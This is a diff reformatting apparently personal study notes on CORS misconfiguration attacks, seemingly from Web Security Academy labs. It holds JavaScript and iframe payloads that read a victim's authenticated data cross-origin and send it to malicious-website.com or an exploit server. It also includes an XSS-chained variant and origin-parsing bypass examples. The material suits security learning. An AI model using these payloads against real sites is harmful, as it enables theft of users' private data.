@@ -1,12 +1,15 @@
-Cross-origin resource sharing:
+# Cross-origin resource sharing:
 
 a browser mechanism which enables controlled access to resources located outside of a given domain
 
-Same-origin policy:
+## Same-origin policy:
 a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain
+
 generally allows a domain to issue requests to other domains, but not to access the responses
 
+## Examples
 
+```
 GET /sensitive-victim-data HTTP/1.1
 Host: vulnerable-website.com
 Origin: https://malicious-website.com
@@ -15,7 +18,9 @@ Cookie: sessionid=...
 HTTP/1.1 200 OK
 Access-Control-Allow-Origin: https://malicious-website.com
 Access-Control-Allow-Credentials: true
+```
 
+```
 var req = new XMLHttpRequest();
 req.onload = reqListener;
 req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
@@ -25,8 +30,9 @@ req.send();
 function reqListener() {
 	location='//malicious-website.com/log?key='+this.responseText;
 };
+```
 
-
+```
 <script>
     var req = new XMLHttpRequest();
     req.onload = reqListener;
@@ -38,23 +44,29 @@ function reqListener() {
         location='/log?key='+this.responseText;
     };
 </script>
+```
 
-
-Errors parsing Origin headers:
+## Errors parsing Origin headers:
 normal-website.com
+
 hackersnormal-website.com
+
 normal-website.com.evil-user.net
 
-Null origin value:
+## Null origin value:
 Cross-origin redirects
+
 Requests from serialized data
+
 Request using the file: protocol
+
 Sandboxed cross-origin requests
 
 Some applications might whitelist the null origin to support local development of the application
+
 using a sandboxed iframe cross-origin request of the form:
 
-
+```
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
 var req = new XMLHttpRequest();
 req.onload = reqListener;
@@ -66,20 +78,23 @@ function reqListener() {
 location='malicious-website.com/log?key='+this.responseText;
 };
 </script>"></iframe>
+```
 
+## Exploiting XSS via CORS trust relationships:
 
-Exploiting XSS via CORS trust relationships:
-
-
+```
 <script>
 document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
 </script>
+```
 
+`Access-Control-Allow-Credentials: true`
 
-Access-Control-Allow-Credentials: true
 Without that header, the victim user's browser will refuse to send their cookies, meaning the attacker will only gain access to unauthenticated content
 
-Intranets:
+## Intranets:
+```
 GET /reader?url=doc1.pdf
 Host: intranet.normal-website.com
 Origin: https://normal-website.com
+```
